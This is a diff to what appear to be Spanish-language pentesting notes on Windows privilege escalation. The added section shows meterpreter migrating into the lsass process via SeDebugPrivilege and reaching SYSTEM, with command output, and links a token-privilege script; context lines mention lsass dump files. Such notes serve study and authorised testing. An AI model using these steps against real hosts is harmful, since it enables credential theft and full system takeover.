@@ -106,6 +106,35 @@ Opening : 'lsass.dmp' file for minidump...
 - Podemos utilizar el [siguiente script](https://github.com/decoder-it/psgetsystem)
     - `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`
 
+### Migrar proceso lsass a un proceso con SeDebugPrivilege
+- Si tenemos el privilegio SeDebugPrivilege podemos migrar el proceso lsass.
+
+```PowerShell
+PS C:\Users\Public> Get-Process lsass
+Get-Process lsass
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+   1299      32     7200      19236       5.56    672   0 lsass                                          
+
+```
+
+---
+
+``` 
+meterpreter > migrate 672
+[*] Migrating from 6648 to 672...
+[*] Migration completed successfully.
+
+meterpreter > getsystem
+[-] Already running as SYSTEM
+```
+
+----
+
+- También podemos usar este script para activar todos los tokens privs [EnableAllTokenPrivs](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1)
+
+
 ## SeTakeOwnerPrivilege
 - Este privilegio permite la habilidad de tomar ownership de cualquier objeto.
     - NTFS, Registry, File, Process, Thread, Semaphore, Mutex, Desktop, Window Station, Message Queue, Job, and Section.
